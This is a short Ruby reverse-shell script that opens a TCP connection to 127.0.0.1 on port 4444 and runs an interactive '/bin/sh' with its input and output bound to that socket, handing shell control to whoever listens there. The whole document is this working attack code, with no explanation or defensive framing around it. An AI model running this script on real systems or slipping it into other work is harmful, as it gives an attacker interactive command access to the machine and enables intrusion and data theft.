require 'socket'

ip="127.0.0.1"
port=4444

f = TCPSocket.open(ip, port)
exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)
